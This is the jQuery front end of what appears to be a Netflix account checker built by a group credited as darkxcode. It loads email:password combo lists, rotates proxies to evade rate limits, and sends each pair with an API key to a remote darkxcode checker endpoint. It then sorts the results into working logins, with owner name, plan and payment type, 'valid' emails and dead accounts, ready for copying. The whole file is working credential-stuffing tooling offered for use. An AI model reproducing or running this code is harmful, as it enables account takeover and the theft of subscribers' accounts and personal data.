/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/

$(document).ready(function() {
    // Set current year for copyright
    $('#currentYear').text(new Date().getFullYear());
    
    // Theme toggle functionality
    $('#toggleTheme').click(function() {
        $('body').toggleClass('light-mode');
        if ($('body').hasClass('light-mode')) {
            $(this).html('<i class="fas fa-sun"></i>');
            $('body').css({
                'background-color': '#f8f9fa',
                'color': '#212529'
            });
            $('.card').css('background-color', '#fff');
            $('.form-control, .form-select').css({
                'background-color': '#fff',
                'color': '#212529'
            });
        } else {
            $(this).html('<i class="fas fa-moon"></i>');
            $('body').css({
                'background-color': '#141414',
                'color': '#f5f5f1'
            });
            $('.card').css('background-color', 'rgba(0, 0, 0, 0.7)');
            $('.form-control, .form-select').css({
                'background-color': 'rgba(255, 255, 255, 0.1)',
                'color': '#f5f5f1'
            });
        }
    });
    
    // File upload handling
    $('#fileUpload').change(function(e) {
        const file = e.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                $('#accountList').val(e.target.result);
                updateAccountCount();
            };
            reader.readAsText(file);
        }
    });
    
    // Update account count when textarea changes
    $('#accountList').on('input', updateAccountCount);
    
    function updateAccountCount() {
        const accounts = $('#accountList').val().split('\n').filter(line => line.trim() !== '');
        $('#totalAccounts').text(accounts.length);
        $('#remainingAccounts').text(accounts.length);
        updateProgressBar(0);
    }
    
    function updateProgressBar(percentage) {
        $('#progressBar').css('width', percentage + '%').attr('aria-valuenow', percentage);
    }
    
    // Copy buttons functionality
    $('#copySuccess').click(function() {
        copyToClipboard('#successResults');
    });
    
    $('#copyValid').click(function() {
        copyToClipboard('#validResults');
    });
    
    $('#copyDie').click(function() {
        copyToClipboard('#dieResults');
    });
    
    function copyToClipboard(selector) {
        const text = $(selector).text().trim();
        if (text) {
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard!');
            }, function() {
                alert('Failed to copy to clipboard');
            });
        }
    }
    
    // Clear buttons functionality
    $('#clearSuccess').click(function() {
        $('#successResults').empty().html('<div class="text-center text-muted py-3">No successful logins yet</div>');
        $('#successCount').text('0');
    });
    
    $('#clearValid').click(function() {
        $('#validResults').empty().html('<div class="text-center text-muted py-3">No valid emails yet</div>');
        $('#validCount').text('0');
    });
    
    $('#clearDie').click(function() {
        $('#dieResults').empty().html('<div class="text-center text-muted py-3">No die accounts yet</div>');
        $('#dieCount').text('0');
    });
    
    // Email validation function
    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
    
    // Parse account list
    function parseAccounts(text) {
        return text.split('\n')
            .map(line => line.trim())
            .filter(line => line !== '')
            .map(line => {
                let email, password;
                if (line.includes('|')) {
                    [email, password] = line.split('|').map(part => part.trim());
                } else if (line.includes(':')) {
                    [email, password] = line.split(':').map(part => part.trim());
                } else {
                    return null;
                }
                
                if (email && password && isValidEmail(email)) {
                    return { email, password, original: line };
                }
                return null;
            })
            .filter(account => account !== null);
    }
    
    // Parse proxy list
    function parseProxies(text) {
        return text.split('\n')
            .map(line => line.trim())
            .filter(line => line !== '')
            .filter(line => line.includes(':') && line.split(':').length >= 2);
    }
    
    // Start checking process
    let isChecking = false;
    let currentAccounts = [];
    let currentProxies = [];
    let checkedCount = 0;
    let successCount = 0;
    let validCount = 0;
    let dieCount = 0;
    
    $('#startCheck').click(function() {
        // Validate inputs
        const apikey = $('#apikey').val().trim();
        const proxyText = $('#proxy').val().trim();
        const proxyType = $('#proxyType').val();
        const accountText = $('#accountList').val().trim();
        const useRandomProxy = $('#useRandomProxy').is(':checked');
        
        if (!apikey) {
            alert('API Key is required!');
            return;
        }
        
        if (!proxyText) {
            alert('Proxy is required!');
            return;
        }
        
        if (!proxyType) {
            alert('Proxy type is required!');
            return;
        }
        
        if (!accountText) {
            alert('Account list is required!');
            return;
        }
        
        // Parse accounts and proxies
        currentAccounts = parseAccounts(accountText);
        currentProxies = parseProxies(proxyText);

/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/

        if (currentAccounts.length === 0) {
            alert('No valid accounts found. Please check the format.');
            return;
        }
        
        if (currentProxies.length === 0) {
            alert('No valid proxies found. Please check the format.');
            return;
        }
        
        // Update UI
        $('#totalAccounts').text(currentAccounts.length);
        $('#remainingAccounts').text(currentAccounts.length);
        $('#checkedAccounts').text('0');
        $('#successCount').text('0');
        $('#validCount').text('0');
        $('#dieCount').text('0');
        checkedCount = 0;
        successCount = 0;
        validCount = 0;
        dieCount = 0;
        updateProgressBar(0);
        
        // Clear previous results
        $('#successResults').empty();
        $('#validResults').empty();
        $('#dieResults').empty();
        
        // Disable start button and enable stop button
        $('#startCheck').prop('disabled', true);
        $('#stopCheck').prop('disabled', false);
        isChecking = true;
        
        // Start checking accounts
        checkNextAccount();
    });
    
    $('#stopCheck').click(function() {
        isChecking = false;
        $('#startCheck').prop('disabled', false);
        $('#stopCheck').prop('disabled', true);
    });
    
    function checkNextAccount() {
        if (!isChecking || currentAccounts.length === 0) {
            // Checking completed or stopped
            $('#startCheck').prop('disabled', false);
            $('#stopCheck').prop('disabled', true);
            return;
        }
        
        const account = currentAccounts.shift();
        const proxyAuth = $('#proxyAuth').val().trim();
        const proxyType = $('#proxyType').val();
        const apikey = $('#apikey').val().trim();
        const useRandomProxy = $('#useRandomProxy').is(':checked');
        
        // Select proxy
        let proxy;
        if (useRandomProxy) {
            const randomIndex = Math.floor(Math.random() * currentProxies.length);
            proxy = currentProxies[randomIndex];
        } else {
            proxy = currentProxies[checkedCount % currentProxies.length];
        }
        
        // Build API URL
        const baseUrl = 'https://api.darkxcode.site/checker/netflix-checker/';
        const params = {
            lists: account.original,
            proxy: proxy,
            proxyAuth: proxyAuth,
            type_proxy: proxyType,
            apikey: apikey
        };
        
        const queryString = Object.keys(params)
            .map(key => `${key}=${encodeURIComponent(params[key])}`)
            .join('&');
        
        const apiUrl = `${baseUrl}?${queryString}`;
        
        // Make API request
        $.ajax({
            url: apiUrl,
            method: 'GET',
            timeout: 30000,
            success: function(response) {
                handleResponse(response, account);
            },
            error: function(xhr, status, error) {
                handleError(error, account);
            },
            complete: function() {
                checkedCount++;
                $('#checkedAccounts').text(checkedCount);
                $('#remainingAccounts').text(currentAccounts.length);
                updateProgressBar((checkedCount / (checkedCount + currentAccounts.length)) * 100);
                
                // Check next account with a small delay to avoid rate limiting
                setTimeout(checkNextAccount, 100);
            }
        });
    }
/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/
    function handleResponse(response, account) {
        if (response && response.data) {
            const status = response.data.status;
            const valid = response.data.valid;
            const message = response.data.info?.msg;
            
            if (status === "success" && valid === "true") {
                // SUCCESS LOGIN
                successCount++;
                $('#successCount').text(successCount);
                
                const accountInfo = response.data.info;
                const accountHtml = `
                    <div class="account-item success-item">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <strong>${accountInfo.email}</strong> | ${accountInfo.password}
                                <br><small>Name: ${accountInfo.accounts?.fullname || 'N/A'}</small>
                                <br><small>Type: ${accountInfo.accounts?.type_accounts || 'N/A'}</small>
                                <br><small>Payment: ${accountInfo.accounts?.type_payment || 'N/A'}</small>
                                <br><small>Message: ${message}</small>
                            </div>
                            <button class="btn btn-sm btn-outline-success copy-btn" data-text="${account.original}">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                `;
                
                if ($('#successResults').children('.text-center').length > 0) {
                    $('#successResults').empty();
                }
                $('#successResults').append(accountHtml);
            } else if (message && (
                message.includes("ACCOUNT ON HOLD") || 
                message.includes("INVALID PASSWORD") || 
                message.includes("ACCOUNT SUSPENDED")
            )) {
                // VALID EMAIL
                validCount++;
                $('#validCount').text(validCount);
                
                const accountHtml = `
                    <div class="account-item valid-item">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <strong>${account.email}</strong> | ${account.password}
                                <br><small>Message: ${message}</small>
                            </div>
                            <button class="btn btn-sm btn-outline-warning copy-btn" data-text="${account.original}">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                `;
                
                if ($('#validResults').children('.text-center').length > 0) {
                    $('#validResults').empty();
                }
                $('#validResults').append(accountHtml);
            } else if (message && (
                message.includes("INVALID EMAIL ADDRESS") || 
                message.includes("INVALID COOKIES") || 
                message.includes("INVALID ACCOUNT")
            )) {
                // DIE
                dieCount++;
                $('#dieCount').text(dieCount);
                
                const accountHtml = `
                    <div class="account-item die-item">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <strong>${account.email}</strong> | ${account.password}
                                <br><small>Message: ${message}</small>
                            </div>
                            <button class="btn btn-sm btn-outline-danger copy-btn" data-text="${account.original}">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                `;
                
                if ($('#dieResults').children('.text-center').length > 0) {
                    $('#dieResults').empty();
                }
                $('#dieResults').append(accountHtml);
            } else {
                // Other error responses
                dieCount++;
                $('#dieCount').text(dieCount);
                
                const accountHtml = `
                    <div class="account-item die-item">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <strong>${account.email}</strong> | ${account.password}
                                <br><small>Error: ${message || 'Unknown error'}</small>
                            </div>
                            <button class="btn btn-sm btn-outline-danger copy-btn" data-text="${account.original}">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                `;
                
                if ($('#dieResults').children('.text-center').length > 0) {
                    $('#dieResults').empty();
                }
                $('#dieResults').append(accountHtml);
            }
        } else {
            // Invalid response format
            handleError("Invalid response format", account);
        }
        
        // Add copy functionality to the new buttons
        $('.copy-btn').off('click').on('click', function() {
            const text = $(this).data('text');
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard: ' + text);
            }, function() {
                alert('Failed to copy to clipboard');
            });
        });
    }
/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/    
    function handleError(error, account) {
        dieCount++;
        $('#dieCount').text(dieCount);
        
        const accountHtml = `
            <div class="account-item die-item">
                <div class="d-flex justify-content-between align-items-start">
                    <div>
                        <strong>${account.email}</strong> | ${account.password}
                        <br><small>Error: ${error || 'Unknown error'}</small>
                    </div>
                    <button class="btn btn-sm btn-outline-danger copy-btn" data-text="${account.original}">
                        <i class="fas fa-copy"></i>
                    </button>
                </div>
            </div>
        `;
        
        if ($('#dieResults').children('.text-center').length > 0) {
            $('#dieResults').empty();
        }
        $('#dieResults').append(accountHtml);
        
        // Add copy functionality to the new button
        $('.copy-btn').off('click').on('click', function() {
            const text = $(this).data('text');
            navigator.clipboard.writeText(text).then(function() {
                alert('Copied to clipboard: ' + text);
            }, function() {
                alert('Failed to copy to clipboard');
            });
        });
    }
    
    // Initial account count update
    updateAccountCount();
});